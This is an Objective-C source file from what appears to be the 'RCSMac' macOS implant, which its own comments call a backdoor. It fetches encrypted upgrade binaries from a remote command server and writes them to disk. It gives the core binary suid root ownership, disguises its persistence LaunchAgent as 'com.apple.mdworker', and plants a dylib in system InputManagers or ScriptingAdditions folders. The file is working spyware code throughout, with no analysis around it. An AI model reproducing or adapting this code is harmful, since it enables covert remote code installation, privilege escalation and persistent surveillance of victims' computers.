/*
 *  UpgradeNetworkOperation.m
 *  RCSMac
 *
 *
 *  Created by revenge on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UpgradeNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define CORE_UPGRADE  @"core"
#define DYLIB_UPGRADE @"inputmanager"
#define KEXT_UPGRADE  @"driver"


@interface UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath;

@end

@implementation UpgradeNetworkOperation (private)

- (BOOL)_updateFilesForCoreUpgrade: (NSString *)upgradePath
{
  BOOL success = NO;
  
  //
  // Forcing suid permission on the backdoor upgrade
  //
  u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
  NSValue *owner      = [NSNumber numberWithInt: 0];
  
  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                  permission,
                                  NSFilePosixPermissions,
                                  owner,
                                  NSFileOwnerAccountID,
                                  nil];
  
  success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                             ofItemAtPath: upgradePath
                                                    error: nil];
  
  if (success == NO)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"Error while changing attributes on the upgrade file");
#endif
      return success;
    }
  
  //
  // Once the backdoor has been written, edit the backdoor Loader in order to
  // load the new updated backdoor upon reboot/login
  //
  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                   NSHomeDirectory(),
                                   BACKDOOR_DAEMON_PLIST];
  
  NSError *error = nil;
  if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
                                                 error: &error] == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
#endif
    }
  
  [backdoorLaunchAgent release];
  
  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
                                forBinary: gBackdoorUpdateName];
  
  if (success == NO)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"Error while writing backdoor launchAgent plist");
#endif
    }
  else
    {
#ifdef DEBUG_UP_NOP
      infoLog(@"LaunchAgent file updated");
#endif
    }
  
  return YES;
}

@end


@implementation UpgradeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if ((self = [super init]))
    {
      mTransport = aTransport;
      
#ifdef DEBUG_UPGRADE_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"");
#endif
  
  uint32_t command              = PROTO_UPGRADE;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  NSData *commandSha            = [commandData sha1Hash];
  
  [commandData appendData: commandSha];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"empty reply from server");
#endif
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"No upload request available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on parameters makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_UPGRADE_NOP
  infoLog(@"packetSize    : %d", packetSize);
  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
  infoLog(@"filenameSize  : %d", filenameSize);
  infoLog(@"fileSize      : %d", fileSize);
#endif
  
  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"exception on stringData makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  if (filename == nil)
    {
#ifdef DEBUG_UPGRADE_NOP
      errorLog(@"filename is empty, error on unpascalize");
#endif
    }
  else
    {
#ifdef DEBUG_UPGRADE_NOP
      infoLog(@"filename: %@", filename);
      infoLog(@"file content: %@", fileContent);
#endif
    
      if ([filename isEqualToString: CORE_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a core upgrade");
#endif
          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    gBackdoorUpdateName];
          
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Writing core upgrade @ %@", _upgradePath);
#endif
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          if ([self _updateFilesForCoreUpgrade: _upgradePath] == NO)
            {
#ifdef DEBUG_UPGRADE_NOP
              errorLog(@"Error while updating files for core upgrade");
#endif
            }
          
          [_upgradePath release];
        }
      else if ([filename isEqualToString: DYLIB_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a dylib upgrade");
#endif
          
          NSString *_upgradePath;
          NSString *_tempLocalPath = [[NSString alloc] initWithFormat:
                                      @"%@/%@",
                                      [[NSBundle mainBundle] bundlePath],
                                      gInputManagerName];

          if ([gUtil isLeopard])
            {
              _upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                           @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
                           EXT_BUNDLE_FOLDER,
                           EXT_BUNDLE_FOLDER,
                           gInputManagerName];

              //
              // Force owner since we can't remove that file if not owned by us
              // with removeItemAtPath:error (Required only on Leopard)
              //
              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                                         userAndGroup,
                                         _upgradePath,
                                         nil];

              [gUtil executeTask: @"/usr/sbin/chown"
                   withArguments: _tempArguments
                    waitUntilEnd: YES];
            }
          else
            {
              _upgradePath = [[NSString alloc] initWithFormat:
                @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@", 
                EXT_BUNDLE_FOLDER,
                gInputManagerName];
            }
          
          // Now remove it
          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                     error: nil];

          // And write it back
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          //
          // Write it inside the local folder so that next time the backdoor starts
          // it won't overwrite it within the old one
          //
          [[NSFileManager defaultManager] removeItemAtPath: _tempLocalPath
                                                     error: nil];
          [fileContent writeToFile: _tempLocalPath
                        atomically: YES];

          [_tempLocalPath release];

          NSArray *arguments = [NSArray arrayWithObjects:
                                @"-R",
                                @"root:admin",
                                _upgradePath,
                                nil];

          [gUtil executeTask: @"/usr/sbin/chown"
               withArguments: arguments
                waitUntilEnd: YES];
          
          [_upgradePath release];
        }
      else if ([filename isEqualToString: KEXT_UPGRADE])
        {
#ifdef DEBUG_UPGRADE_NOP
          infoLog(@"Received a kext upgrade, not yet implemented");
#endif
          
          // TODO: Update kext binary inside Resources subfolder
        }
      else
        {
#ifdef DEBUG_UPGRADE_NOP
          errorLog(@"Upgrade not supported (%@)", filename);
#endif
        }
    }
  
  [fileContent release];
  [stringData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  return YES;
}

@end
